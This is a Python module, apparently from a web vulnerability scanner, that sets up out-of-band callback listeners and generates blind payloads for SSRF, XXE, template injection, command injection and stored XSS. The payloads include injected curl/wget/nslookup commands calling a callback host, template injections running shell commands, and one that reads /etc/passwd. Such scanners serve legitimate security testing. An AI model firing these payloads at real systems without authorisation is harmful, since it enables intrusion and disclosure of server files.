"""
cyberm4fia-scanner - Out-Of-Band (OOB) Testing Module v2
Supports: Interactsh (DNS+HTTP), Webhook.site, Local HTTP Listener
Provides blind payload factories for SSRF, XXE, SSTI, CMDi
"""

import sys
import os

import httpx


import time
import uuid
import socket
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.colors import Colors, log_info, log_success, log_warning


# ─────────────────────────────────────────────────────
# Local HTTP Callback Listener
# ─────────────────────────────────────────────────────
class CallbackHandler(BaseHTTPRequestHandler):
    """HTTP handler that silently records all incoming requests."""

    hits = []
    lock = threading.Lock()

    def do_GET(self):
        with self.lock:
            self.hits.append(
                {
                    "method": "GET",
                    "path": self.path,
                    "headers": dict(self.headers),
                    "ip": self.client_address[0],
                    "time": time.time(),
                    "query": parse_qs(urlparse(self.path).query),
                }
            )
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"OK")

    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length).decode("utf-8", errors="ignore")
        with self.lock:
            self.hits.append(
                {
                    "method": "POST",
                    "path": self.path,
                    "headers": dict(self.headers),
                    "body": body[:2000],
                    "ip": self.client_address[0],
                    "time": time.time(),
                    "query": parse_qs(urlparse(self.path).query),
                }
            )
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"OK")

    def log_message(self, format, *args):
        """Suppress default HTTP server logging."""
        pass


class LocalListener:
    """Start a local HTTP callback server in a background thread."""

    def __init__(self, port=9999):
        self.port = port
        self.server = None
        self.thread = None
        self.ready = False

        try:
            self.server = HTTPServer(("0.0.0.0", port), CallbackHandler)
            self.clear_hits()
            self.thread = threading.Thread(
                target=self.server.serve_forever, daemon=True
            )
            self.thread.start()
            self.ready = True
            log_info(f"Local OOB listener started on port {port}")
        except OSError as e:
            log_warning(f"Could not start local listener on port {port}: {e}")

    def get_url(self, public_ip=None):
        """Get the callback URL."""
        if public_ip:
            return f"http://{public_ip}:{self.port}"
        # Try to detect public IP
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return f"http://{ip}:{self.port}"
        except Exception:
            return f"http://127.0.0.1:{self.port}"

    def get_hits(self):
        """Get all recorded callback hits."""
        with CallbackHandler.lock:
            return list(CallbackHandler.hits)

    def clear_hits(self):
        """Clear recorded hits."""
        with CallbackHandler.lock:
            CallbackHandler.hits.clear()

    def stop(self):
        """Stop the listener."""
        if self.server:
            self.server.shutdown()
            self.server.server_close()
        self.clear_hits()
        self.ready = False


# ─────────────────────────────────────────────────────
# Interactsh Client (ProjectDiscovery) — Full Crypto Protocol
# ─────────────────────────────────────────────────────
class InteractshClient:
    """
    Full Interactsh client with RSA key exchange and AES-encrypted polling.
    Registers with the Interactsh server, generates unique subdomains,
    and polls for DNS/HTTP/SMTP interactions with proper decryption.
    """

    def __init__(self, server="oast.fun"):
        self.server = server
        self.ready = False
        self.private_key = None
        self.correlation_id = ""
        self.secret_key = ""
        self.domain = ""

        try:
            from cryptography.hazmat.primitives.asymmetric import rsa as _rsa
            from cryptography.hazmat.primitives import serialization as _ser
            import base64 as _b64

            self.correlation_id = str(uuid.uuid4()).replace("-", "")[:20]
            self.secret_key = str(uuid.uuid4())
            self.private_key = _rsa.generate_private_key(
                public_exponent=65537, key_size=2048
            )
            pub_bytes = self.private_key.public_key().public_bytes(
                encoding=_ser.Encoding.PEM,
                format=_ser.PublicFormat.SubjectPublicKeyInfo,
            )
            pub_b64 = _b64.b64encode(pub_bytes).decode()

            resp = httpx.post(
                f"https://{self.server}/register",
                json={
                    "public-key": pub_b64,
                    "secret-key": self.secret_key,
                    "correlation-id": self.correlation_id,
                },
                verify=False,
                timeout=10,
            )
            if resp.status_code == 200:
                self.domain = f"{self.correlation_id}.{self.server}"
                self.ready = True
                log_info(f"Interactsh OOB domain: {self.domain}")
            else:
                log_warning(f"Interactsh registration failed: {resp.status_code}")
                # Fallback to simple mode (no polling)
                self.correlation_id = uuid.uuid4().hex[:12]
                self.domain = f"{self.correlation_id}.{self.server}"
                self.ready = True

        except ImportError:
            log_warning("cryptography not installed — Interactsh in simple mode")
            self.correlation_id = uuid.uuid4().hex[:12]
            self.domain = f"{self.correlation_id}.{self.server}"
            self.ready = True
        except Exception as e:
            log_warning(f"Interactsh init failed: {e} — using simple mode")
            self.correlation_id = uuid.uuid4().hex[:12]
            self.domain = f"{self.correlation_id}.{self.server}"
            self.ready = True

    def generate_subdomain(self, tag=""):
        """Generate a unique subdomain for tracking."""
        unique = uuid.uuid4().hex[:8]
        if tag:
            return f"{tag}.{unique}.{self.domain}"
        return f"{unique}.{self.domain}"

    def get_url(self, tag="", protocol="http"):
        """Generate a full callback URL."""
        subdomain = self.generate_subdomain(tag)
        return f"{protocol}://{subdomain}"

    def get_dns_payload(self, tag=""):
        """Generate a DNS-only callback payload (no HTTP needed)."""
        return self.generate_subdomain(tag)

    def poll(self):
        """
        Poll Interactsh server for interactions and decrypt responses.
        Returns list of interaction dicts (protocol, remote-address, etc).
        """
        if not self.private_key or not self.secret_key:
            return []

        try:
            import base64 as _b64
            import json as _json
            from cryptography.hazmat.primitives.asymmetric import padding as _pad
            from cryptography.hazmat.primitives import hashes as _h
            from cryptography.hazmat.primitives.ciphers import (
                Cipher as _Cipher,
                algorithms as _alg,
                modes as _modes,
            )

            resp = httpx.get(
                f"https://{self.server}/poll"
                f"?id={self.correlation_id}&secret={self.secret_key}",
                verify=False,
                timeout=10,
            )
            if resp.status_code != 200:
                return []

            data = resp.json()
            if not data.get("data"):
                return []

            # Decrypt AES key with our RSA private key
            enc_aes_key = _b64.b64decode(data["aes_key"])
            aes_key = self.private_key.decrypt(
                enc_aes_key,
                _pad.OAEP(
                    mgf=_pad.MGF1(algorithm=_h.SHA256()),
                    algorithm=_h.SHA256(),
                    label=None,
                ),
            )

            # Decrypt each interaction log
            logs = []
            for item in data.get("data", []):
                try:
                    raw_bytes = _b64.b64decode(item)
                    iv = raw_bytes[:16]
                    ciphertext = raw_bytes[16:]
                    cipher = _Cipher(_alg.AES(aes_key), _modes.CFB(iv))
                    decryptor = cipher.decryptor()
                    decrypted = decryptor.update(ciphertext) + decryptor.finalize()
                    logs.append(_json.loads(decrypted.decode("utf-8")))
                except Exception:
                    pass
            return logs

        except Exception:
            return []


# ─────────────────────────────────────────────────────
# Webhook.site Client (Fallback)
# ─────────────────────────────────────────────────────
class WebhookClient:
    """Use webhook.site as OOB callback (rate-limited, best as fallback)."""

    def __init__(self):
        self.ready = False
        self.uuid = ""
        self.http_url = ""
        self.api_url = ""

        try:
            import httpx

            log_info("Initializing webhook.site OOB endpoint...")
            resp = httpx.post("https://webhook.site/token", json={}, timeout=10)
            if resp.status_code in (200, 201):
                self.uuid = resp.json()["uuid"]
                self.http_url = f"https://webhook.site/{self.uuid}"
                self.api_url = f"https://webhook.site/token/{self.uuid}/requests"
                self.ready = True
                log_info(f"Webhook OOB ready: {self.http_url}")
            else:
                log_warning(f"Webhook.site setup failed: {resp.status_code}")
        except Exception as e:
            log_warning(f"Webhook.site init failed: {e}")

    def get_url(self, tag=""):
        """Get callback URL with optional tag."""
        if not self.ready:
            return ""
        if tag:
            return f"{self.http_url}?tag={tag}"
        return self.http_url

    def poll(self):
        """Poll for received callbacks."""
        if not self.ready:
            return []
        try:
            import httpx

            resp = httpx.get(self.api_url, timeout=10)
            if resp.status_code == 200:
                return resp.json().get("data", [])
        except Exception:
            pass
        return []


# ─────────────────────────────────────────────────────
# Unified OOB Manager
# ─────────────────────────────────────────────────────
class OOBClient:
    """
    Unified OOB client — tries in order:
    1. Local HTTP listener (fastest, no external dependency)
    2. Interactsh (DNS + HTTP, no API key)
    3. Webhook.site (HTTP only, rate-limited fallback)
    """

    def __init__(self, listener_port=9999, prefer_local=True):
        self.ready = False
        self.local = None
        self.interactsh = None
        self.webhook = None
        self.found_vulns = []

        # 1. Local listener
        if prefer_local:
            self.local = LocalListener(port=listener_port)
            if self.local.ready:
                self.ready = True

        # 2. Interactsh (always available as DNS source)
        try:
            self.interactsh = InteractshClient()
            self.ready = True
        except Exception:
            pass

        # 3. Webhook.site fallback
        if not self.ready:
            self.webhook = WebhookClient()
            if self.webhook and self.webhook.ready:
                self.ready = True

        if self.ready:
            log_success("OOB system ready")
        else:
            log_warning("OOB system could not initialize any provider")

    def generate_payload(self, module_name, param_name=""):
        """Generate a tracking URL (uses best available provider)."""
        tag = f"{module_name}-{param_name}" if param_name else module_name

        if self.local and self.local.ready:
            return f"{self.local.get_url()}/{tag}"

        if self.interactsh:
            return self.interactsh.get_url(tag=tag)

        if self.webhook and self.webhook.ready:
            return self.webhook.get_url(tag=tag)

        return ""

    def generate_dns_payload(self, module_name, param_name=""):
        """Generate a DNS-only payload (Interactsh)."""
        if self.interactsh:
            tag = f"{module_name}-{param_name}" if param_name else module_name
            return self.interactsh.get_dns_payload(tag=tag)
        return ""

    def poll(self):
        """Check all providers for new callbacks."""
        new_hits = []

        # Check local listener
        if self.local and self.local.ready:
            hits = self.local.get_hits()
            for hit in hits:
                hit_id = f"{hit['ip']}:{hit['path']}:{hit.get('time', 0)}"
                if hit_id not in self.found_vulns:
                    self.found_vulns.append(hit_id)
                    new_hits.append(hit)
                    _display_hit(hit, "Local Listener")

        # Check webhook.site
        if self.webhook and self.webhook.ready:
            wh_hits = self.webhook.poll()
            for hit in wh_hits:
                hit_id = hit.get("uuid", str(time.time()))
                if hit_id not in self.found_vulns:
                    self.found_vulns.append(hit_id)
                    new_hits.append(hit)
                    _display_hit(hit, "Webhook.site")

        return new_hits

    def stop(self):
        """Cleanup."""
        if self.local:
            self.local.stop()
        self.found_vulns = []
        self.ready = False


def _display_hit(hit, source):
    """Display a callback hit."""
    log_success(f"🔥 BLIND OOB HIT via {source}!")
    path = hit.get("path", hit.get("url", "N/A"))
    ip = hit.get("ip", "N/A")
    method = hit.get("method", "N/A")
    print(f"    {Colors.RED}Path: {Colors.END}{path}")
    print(f"    {Colors.RED}Source IP: {Colors.END}{ip}")
    print(f"    {Colors.RED}Method: {Colors.END}{method}")

    # Parse module/param from path
    query = hit.get("query", {})
    tag = query.get("tag", [""])[0] if isinstance(query.get("tag"), list) else ""
    if not tag and "/" in str(path):
        parts = str(path).strip("/").split("/")
        if parts:
            tag = parts[-1]
    if tag:
        print(f"    {Colors.RED}Tag: {Colors.END}{tag}")


# ─────────────────────────────────────────────────────
# Blind Payload Factory
# ─────────────────────────────────────────────────────
def generate_blind_payloads(oob_client, module="all"):
    """
    Generate blind exploitation payloads for each vulnerability class.
    Returns dict of {module_name: [payloads]}.
    """
    if not oob_client or not oob_client.ready:
        return {}

    payloads = {}

    # SSRF blind payloads
    if module in ("all", "ssrf"):
        ssrf_url = oob_client.generate_payload("ssrf")
        dns = oob_client.generate_dns_payload("ssrf") if oob_client.interactsh else ""
        payloads["ssrf"] = [
            ssrf_url,
            f"http://{dns}" if dns else None,
            f"https://{dns}" if dns else None,
            f"gopher://{dns}:80" if dns else None,
        ]
        payloads["ssrf"] = [p for p in payloads["ssrf"] if p]

    # XXE blind payloads (OOB exfiltration)
    if module in ("all", "xxe"):
        xxe_url = oob_client.generate_payload("xxe")
        xxe_dns = (
            oob_client.generate_dns_payload("xxe") if oob_client.interactsh else ""
        )
        payloads["xxe"] = [
            f"""<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{xxe_url}">]><root>&xxe;</root>""",
            f"""<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{xxe_url}">%xxe;]><root>test</root>""",
        ]
        if xxe_dns:
            payloads["xxe"].append(
                f"""<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{xxe_dns}">]><root>&xxe;</root>"""
            )

    # SSTI blind payloads (trigger OOB via template execution)
    if module in ("all", "ssti"):
        ssti_url = oob_client.generate_payload("ssti")
        payloads["ssti"] = [
            # Jinja2 — curl/wget OOB
            "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
            f"""{{% import os %}}{{{{os.popen('curl {ssti_url}').read()}}}}""",
            f"""{{% import os %}}{{{{os.popen('wget {ssti_url}').read()}}}}""",
            # Twig
            f"""{{{{['curl {ssti_url}']|filter('system')}}}}""",
        ]

    # CMDi blind payloads (time-based + OOB)
    if module in ("all", "cmdi"):
        cmdi_url = oob_client.generate_payload("cmdi")
        cmdi_dns = (
            oob_client.generate_dns_payload("cmdi") if oob_client.interactsh else ""
        )
        payloads["cmdi"] = [
            f"; curl {cmdi_url}",
            f"| curl {cmdi_url}",
            f"`curl {cmdi_url}`",
            f"$(curl {cmdi_url})",
            f"; wget {cmdi_url}",
            f"| wget {cmdi_url}",
        ]
        if cmdi_dns:
            payloads["cmdi"].extend(
                [
                    f"; nslookup {cmdi_dns}",
                    f"| nslookup {cmdi_dns}",
                    f"`nslookup {cmdi_dns}`",
                    f"$(nslookup {cmdi_dns})",
                    f"; dig {cmdi_dns}",
                    f"| ping -c 1 {cmdi_dns}",
                ]
            )

    # Blind XSS payloads (stored → fires when admin views)
    if module in ("all", "xss"):
        xss_url = oob_client.generate_payload("xss")
        payloads["xss"] = [
            f'"><img src={xss_url}>',
            f"'><img src={xss_url}>",
            f'"><script src={xss_url}></script>',
            f"<img src=x onerror=\"fetch('{xss_url}')\">",
        ]

    return payloads
